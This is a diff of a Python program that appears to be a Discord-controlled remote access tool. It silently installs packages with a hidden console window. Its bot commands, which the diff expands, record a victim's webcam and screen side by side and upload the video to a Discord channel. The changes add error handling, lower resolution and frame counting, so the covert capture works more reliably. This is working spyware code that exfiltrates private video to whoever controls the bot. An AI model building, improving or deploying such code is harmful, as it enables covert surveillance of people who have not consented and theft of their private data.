@@ -12,7 +12,7 @@ from concurrent.futures import ThreadPoolExecutor
 # List of non-standard packages to install
 NON_STANDARD_PACKAGES = [
     "discord.py",
-    "pyautogui",
+    "pyautogui", 
     "opencv-python",
     "numpy",
     "pywin32",
@@ -22,31 +22,37 @@ NON_STANDARD_PACKAGES = [
     "pycryptodome",
     "comtypes",
     "requests",
-    "pyscreeze",
-    "mss"  # Add this as a backup
+    "pyscreeze==0.1.28",  # Pin to stable version
+    "mss"  # Alternative screenshot library as backup
 ]
+
 def install_packages():
     """Install non-standard Python packages with hidden console on Windows."""
     creationflags = subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
 
-    # Special mapping for packages that have different import names
-    package_mapping = {
-        "opencv-python": "cv2",
-        "pycryptodome": "Cryptodome",
-        "pillow": "PIL",
-        "pyscreeze": "pyscreeze"  # Add this line (though it should be the same)
-    }
-
+    # Special import checks for problematic packages
     for package in NON_STANDARD_PACKAGES:
         try:
-            # Use mapping if exists, otherwise use the package name
-            module_name = package_mapping.get(package, package.split(".")[0])
-            __import__(module_name)
+            # Special handling for packages with different import names
+            if package == "opencv-python":
+                __import__("cv2")
+            elif package == "pycryptodome":
+                # Use Crypto for pycryptodome (not Cryptodome)
+                __import__("Crypto")
+            elif package == "pillow":
+                __import__("PIL")
+            elif package == "pyscreeze":
+                __import__("pyscreeze")
+            else:
+                module_name = package.split(".")[0]
+                __import__(module_name)
+                
         except ImportError:
             print(f"Installing {package}...")
             try:
+                # Force install and upgrade if needed
                 subprocess.run(
-                    [sys.executable, "-m", "pip", "install", package],
+                    [sys.executable, "-m", "pip", "install", package, "--upgrade"],
                     check=True,
                     creationflags=creationflags,
                     stdout=subprocess.PIPE,
@@ -54,6 +60,16 @@ def install_packages():
                     text=True
                 )
                 print(f"Successfully installed {package}")
+                
+                # Special post-installation check for pycryptodome
+                if package == "pycryptodome":
+                    print("Verifying pycryptodome installation...")
+                    try:
+                        from Crypto.Cipher import AES  # Changed from Cryptodome to Crypto
+                        print("pycryptodome verified successfully!")
+                    except ImportError as e:
+                        print(f"Warning: pycryptodome import still failing: {e}")
+                        
             except subprocess.CalledProcessError as e:
                 print(f"Failed to install {package}: {e.stderr}")
 # Run package installation at startup
@@ -406,64 +422,117 @@ async def record_screen(ctx, duration: int = 10):
             out.release()
         if os.path.exists(video_filename):
             os.remove(video_filename)
-
 @bot.command()
 @is_correct_user_channel()
 async def record_split(ctx, duration: int = 10):
     """
     Records both webcam and screen side-by-side for the specified duration and sends to Discord.
     """
-    if duration <= 0 or duration > 300:
-        await ctx.send("❌ Duration must be between 1 and 300 seconds.")
+    if duration <= 0 or duration > 60:  # Reduced max duration for stability
+        await ctx.send("❌ Duration must be between 1 and 60 seconds.")
         return
 
     await ctx.send(f"📹 Recording webcam + screen for {duration} seconds...")
 
+    cam = None
+    out = None
+    video_filename = "split_record.mp4"
+    
     try:
+        # Initialize webcam
         cam = cv2.VideoCapture(0)
         if not cam.isOpened():
-            await ctx.send("❌ Could not open webcam.")
+            await ctx.send("❌ Could not access webcam.")
             return
+        
+        # Set lower resolution for webcam for better performance
+        cam.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
+        cam.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
+        cam.set(cv2.CAP_PROP_FPS, 15)
 
+        # Get screen size and set smaller output resolution
         screen_width, screen_height = pyautogui.size()
-        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
-        video_filename = "split_record.mp4"
-        out = cv2.VideoWriter(video_filename, fourcc, 20.0, (screen_width, screen_height))
+        # Reduce output resolution to save file size and improve performance
+        output_width = 1280
+        output_height = 720
+        
+        # Use better codec for compression
+        fourcc = cv2.VideoWriter_fourcc(*'mp4v')  # or 'XVID' if mp4v doesn't work
+        out = cv2.VideoWriter(video_filename, fourcc, 10.0, (output_width, output_height))
 
         start_time = time.time()
+        frame_count = 0
+        
+        await ctx.send("🔄 Recording started...")
+
         while (time.time() - start_time) < duration:
+            # Capture webcam frame
             ret, frame_cam = cam.read()
             if not ret:
                 await ctx.send("⚠️ Failed to capture webcam frame.")
                 break
 
-            screenshot = pyautogui.screenshot()
-            frame_screen = cv2.cvtColor(np.array(screenshot), cv2.COLOR_RGB2BGR)
+            try:
+                # Capture screen with error handling
+                screenshot = pyautogui.screenshot()
+                frame_screen = cv2.cvtColor(np.array(screenshot), cv2.COLOR_RGB2BGR)
+                
+                # Resize webcam frame to smaller size
+                cam_height = 360  # Fixed height for webcam
+                cam_width = int(frame_cam.shape[1] * cam_height / frame_cam.shape[0])
+                frame_cam_resized = cv2.resize(frame_cam, (cam_width, cam_height))
+                
+                # Resize screen frame to match total height
+                screen_target_height = cam_height
+                screen_target_width = int(frame_screen.shape[1] * screen_target_height / frame_screen.shape[0])
+                frame_screen_resized = cv2.resize(frame_screen, (screen_target_width, screen_target_height))
+                
+                # Combine frames side by side
+                combined_frame = cv2.hconcat([frame_cam_resized, frame_screen_resized])
+                
+                # Resize to final output dimensions
+                combined_frame = cv2.resize(combined_frame, (output_width, output_height))
+                
+                # Write frame
+                out.write(combined_frame)
+                frame_count += 1
+                
+            except Exception as frame_error:
+                await ctx.send(f"⚠️ Error processing frame: {frame_error}")
+                continue
 
-            # Resize both to same height
-            target_height = min(frame_cam.shape[0], frame_screen.shape[0])
-            frame_cam = cv2.resize(frame_cam, (int(frame_cam.shape[1] * target_height / frame_cam.shape[0]), target_height))
-            frame_screen = cv2.resize(frame_screen, (int(frame_screen.shape[1] * target_height / frame_screen.shape[0]), target_height))
+        # Release resources
+        if cam:
+            cam.release()
+        if out:
+            out.release()
 
-            combined_frame = cv2.hconcat([frame_cam, frame_screen])
-            combined_frame = cv2.resize(combined_frame, (screen_width, screen_height))
-            out.write(combined_frame)
+        if frame_count == 0:
+            await ctx.send("❌ No frames were captured.")
+            return
 
-        cam.release()
-        out.release()
+        await ctx.send(f"✅ Recording completed! Captured {frame_count} frames. Processing video...")
 
         # Send the video file
-        await send_video_file(ctx, video_filename)
+        success = await send_video_file(ctx, video_filename)
+        if not success:
+            await ctx.send("❌ Failed to send video file.")
 
     except Exception as e:
-        await ctx.send(f"❌ Error during split recording: {e}")
-        if 'cam' in locals():
+        await ctx.send(f"❌ Error during split recording: {str(e)}")
+        
+        # Clean up resources
+        if cam:
             cam.release()
-        if 'out' in locals():
+        if out:
             out.release()
+        
+        # Clean up file if it exists
         if os.path.exists(video_filename):
-            os.remove(video_filename)
-
+            try:
+                os.remove(video_filename)
+            except:
+                pass
 @bot.command()
 @is_correct_user_channel()
 async def clean_chat(ctx):
